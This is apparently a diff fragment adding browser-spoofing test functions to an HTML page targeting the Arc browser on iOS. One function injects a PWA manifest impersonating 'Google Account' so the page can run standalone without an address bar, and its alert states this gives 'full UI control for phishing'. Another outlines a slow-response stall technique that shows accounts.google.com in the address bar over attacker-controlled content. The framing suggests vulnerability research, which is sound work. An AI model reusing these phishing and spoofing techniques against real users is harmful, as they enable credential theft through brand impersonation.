+      '<a href="' + s.url.replace(/"/g, '&quot;') + '" style="color:#58a6ff;font-size:11px;word-break:break-all;display:block;margin-top:4px;">' + s.url.replace(/</g, '&lt;') + '</a>' +
+      '</div>';
+  });
+
+  html += '<button onclick="this.parentElement.remove();" style="margin-top:10px;background:#da3633;">Close</button>';
+
+  container.innerHTML = html;
+  document.body.appendChild(container);
+}
+
+
+// ============================================
+// F2: PWA Manifest
+// ============================================
+function testPWA() {
+  log('F2: Injecting PWA manifest...');
+
+  // Create manifest blob
+  let manifest = {
+    name: "Google Account",
+    short_name: "Google",
+    start_url: window.location.href,
+    display: "standalone",
+    background_color: "#ffffff",
+    theme_color: "#4285f4",
+    icons: [{ src: "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>G</text></svg>", sizes: "192x192", type: "image/svg+xml" }]
+  };
+
+  let blob = new Blob([JSON.stringify(manifest)], { type: 'application/json' });
+  let url = URL.createObjectURL(blob);
+
+  let link = document.createElement('link');
+  link.rel = 'manifest';
+  link.href = url;
+  document.head.appendChild(link);
+
+  // Also set theme-color and apple-mobile-web-app-capable
+  let meta1 = document.createElement('meta');
+  meta1.name = 'apple-mobile-web-app-capable';
+  meta1.content = 'yes';
+  document.head.appendChild(meta1);
+
+  let meta2 = document.createElement('meta');
+  meta2.name = 'theme-color';
+  meta2.content = '#4285f4';
+  document.head.appendChild(meta2);
+
+  let meta3 = document.createElement('meta');
+  meta3.name = 'apple-mobile-web-app-status-bar-style';
+  meta3.content = 'black-translucent';
+  document.head.appendChild(meta3);
+
+  alert('F2: PWA manifest injected.\n\nOn Arc iOS:\n1. Check if "Add to Home Screen" is available\n2. If added, it opens in standalone mode = NO address bar\n3. Full UI control for phishing');
+}
+
+
+// ============================================
+// G1: SSE Stall
+// ============================================
+function testSSEStall() {
+  log('G1: Testing SSE/fetch stall technique...');
+
+  // This needs a server that sends chunked response slowly
+  // For local testing, we simulate with a long-polling approach
+
+  let w = window.open('about:blank');
+  if (!w) {
+    log('G1: Popup blocked — cannot test without server', true);
+    alert('G1 requires a slow server to test properly.\n\nConcept: Navigate to target URL served by attacker\'s slow server.\nServer sends HTTP 200 + headers but drips body bytes slowly.\nBrowser shows target URL in address bar while attacker controls partial content.');
+    return;
+  }
+
+  w.document.write('<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="margin:0;font-family:-apple-system,sans-serif;background:#fff;text-align:center;padding:40px;">' +
+    '<h2>G1 — SSE Stall Concept</h2>' +
+    '<p style="color:#666;margin:15px;">This technique requires a controlled server that:</p>' +
+    '<ol style="text-align:left;max-width:300px;margin:0 auto;color:#666;font-size:14px;">' +
+    '<li style="margin:8px 0;">Responds to requests for accounts.google.com (via DNS redirect or proxy)</li>' +
+    '<li style="margin:8px 0;">Sends HTTP 200 OK with headers</li>' +
+    '<li style="margin:8px 0;">Sends body very slowly (1 byte/sec)</li>' +
+    '<li style="margin:8px 0;">Browser shows target URL but content is attacker-controlled partial HTML</li>' +
+    '</ol>' +
+    '<p style="color:#999;margin-top:20px;font-size:12px;">This is a server-side technique — cannot be fully tested client-side.</p>' +
+    '</body></html>');
+  w.document.close();
+}
+</script>
+
+</body>
+</html>
